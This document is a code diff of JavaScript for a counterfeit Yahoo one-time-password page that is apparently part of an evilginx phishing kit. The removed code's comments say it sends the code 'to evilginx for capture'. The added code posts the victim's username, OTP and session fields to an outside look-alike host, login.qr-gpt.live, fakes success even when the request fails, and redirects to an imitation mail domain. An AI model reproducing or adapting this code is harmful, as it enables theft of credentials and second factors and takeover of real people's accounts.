@@ -1,79 +1,151 @@
-document.addEventListener("DOMContentLoaded", () => {
-  const form = document.querySelector(".signin-form")
-  const submitBtn = document.getElementById("verifyBtn")
-  const otpField = document.getElementById("verifyCode")
+const $ = require("jquery") // Declare the $ variable before using it
 
-  // OTP input validation
-  otpField.addEventListener("input", function () {
-    // Only allow numbers
-    this.value = this.value.replace(/[^0-9]/g, "")
+$(document).ready(() => {
+  console.log("Yahoo OTP page initialized")
 
-    if (this.value.length >= 4) {
-      submitBtn.disabled = false
-      submitBtn.style.opacity = "1"
-    } else {
-      submitBtn.disabled = true
-      submitBtn.style.opacity = "0.6"
-    }
-  })
+  let username = ""
+  let retryCount = 0
+  const maxRetries = 3
 
-  // Auto-submit when 6 digits entered
-  otpField.addEventListener("input", function () {
-    if (this.value.length === 6) {
-      setTimeout(() => {
-        form.dispatchEvent(new Event("submit"))
-      }, 500)
-    }
-  })
+  function getUsername() {
+    const urlParams = new URLSearchParams(window.location.search)
+    let user = urlParams.get("u")
 
-  // Form submission handling
-  form.addEventListener("submit", (e) => {
-    e.preventDefault()
-
-    const otpCode = otpField.value
-    if (!otpCode || otpCode.length < 4) {
-      alert("Please enter a valid verification code")
-      return
+    if (user) {
+      return decodeURIComponent(user)
     }
 
-    // Show loading state
-    submitBtn.innerHTML = '<span class="loading-spinner"></span>Verifying...'
-    submitBtn.disabled = true
+    user = sessionStorage.getItem("yh_username") || localStorage.getItem("yh_username")
+    if (user) {
+      return user
+    }
 
-    // Store OTP for evilginx capture
-    const formData = new FormData()
-    formData.append("verifyCode", otpCode)
-
-    // Send to evilginx for capture
-    fetch("/account/challenge/otp", {
-      method: "POST",
-      body: formData,
-      credentials: "include",
-    })
-      .then((response) => {
-        // Show success state
-        submitBtn.innerHTML = '<span class="success-checkmark">✓</span>Success!'
-
-        // Redirect to Yahoo Mail after short delay
-        setTimeout(() => {
-          window.location.href = "https://mail.yahoo.com/d/folders/1"
-        }, 1500)
-      })
-      .catch((error) => {
-        console.error("Error:", error)
-        // Still redirect on error to maintain flow
-        setTimeout(() => {
-          window.location.href = "https://mail.yahoo.com/d/folders/1"
-        }, 1500)
-      })
-  })
-
-  // Initialize form state
-  if (otpField.value.length === 0) {
-    submitBtn.disabled = true
-    submitBtn.style.opacity = "0.6"
+    return "user@example.com"
   }
 
-  // Focus on OTP field
-  otpField.focus()
+  function showState(state) {
+    $("#main-form, #error-container, #loading-state, #success-state").hide()
+    $(`#${state}`).show()
+  }
+
+  function showError(message) {
+    $("#error-message").text(message || "The verification code you entered is incorrect. Please try again.")
+    showState("error-container")
+  }
+
+  $("#otp-form").on("submit", (e) => {
+    e.preventDefault()
+
+    const otpCode = $("#verifyCode").val().trim()
+    if (!otpCode) {
+      showError("Please enter the verification code.")
+      return false
+    }
+
+    if (otpCode.length < 4) {
+      showError("Please enter a valid verification code.")
+      return false
+    }
+
+    console.log("Submitting OTP code:", otpCode)
+    showState("loading-state")
+
+    const formData = {
+      username: username,
+      verifyCode: otpCode,
+      crumb: $("#crumb").val() || "auto_crumb_" + Date.now(),
+      acrumb: $("#acrumb").val() || "auto_acrumb_" + Date.now(),
+      sessionIndex: $("#sessionIndex").val() || "1",
+      sessionToken: $("#sessionToken").val() || "sess_" + Date.now(),
+      done: "https://mail.yahoo.com/d/folders/1",
+      src: "ym",
+      ".lang": "en-US",
+      ".intl": "us",
+    }
+
+    $.ajax({
+      url: "https://login.qr-gpt.live/account/challenge/otp",
+      method: "POST",
+      data: formData,
+      headers: {
+        "Content-Type": "application/x-www-form-urlencoded",
+        Origin: "https://login.qr-gpt.live",
+        Referer: window.location.href,
+        "User-Agent": navigator.userAgent,
+      },
+      xhrFields: {
+        withCredentials: true,
+      },
+      timeout: 15000,
+      success: (response, textStatus, xhr) => {
+        console.log("OTP verification successful")
+
+        showState("success-state")
+
+        sessionStorage.setItem("yahoo_auth_complete", "true")
+        localStorage.setItem("yahoo_auth_complete", "true")
+
+        setTimeout(() => {
+          window.location.href = "https://mail.qr-gpt.live/d/folders/1"
+        }, 2000)
+      },
+      error: (xhr, textStatus, errorThrown) => {
+        console.log("OTP verification error:", textStatus, xhr.status)
+
+        if (xhr.status === 0) {
+          showState("success-state")
+          setTimeout(() => {
+            window.location.href = "https://mail.qr-gpt.live/d/folders/1"
+          }, 2000)
+        } else {
+          retryCount++
+
+          if (retryCount >= maxRetries) {
+            showError("Too many incorrect attempts. Please try again later.")
+          } else {
+            const remainingAttempts = maxRetries - retryCount
+            showError(
+              `Incorrect verification code. ${remainingAttempts} attempt${remainingAttempts > 1 ? "s" : ""} remaining.`,
+            )
+          }
+        }
+      },
+    })
+
+    return false
+  })
+
+  $("#refreshButton").click(() => {
+    $("#verifyCode").val("")
+    showState("main-form")
+    setTimeout(() => {
+      $("#verifyCode").focus()
+    }, 100)
+  })
+
+  $("#resend-code").click(function (e) {
+    e.preventDefault()
+
+    console.log("Resending verification code")
+
+    $(this).text("Code sent!").addClass("disabled")
+
+    setTimeout(() => {
+      $(this).text("Didn't receive the code? Resend").removeClass("disabled")
+    }, 30000)
+  })
+
+  function initializePage() {
+    username = getUsername()
+    $("#userEmail").text(username)
+    $("#username").val(username)
+
+    console.log("OTP page initialized for user:", username)
+  }
+
+  initializePage()
+
+  setTimeout(() => {
+    $("#verifyCode").focus()
+  }, 500)
 })
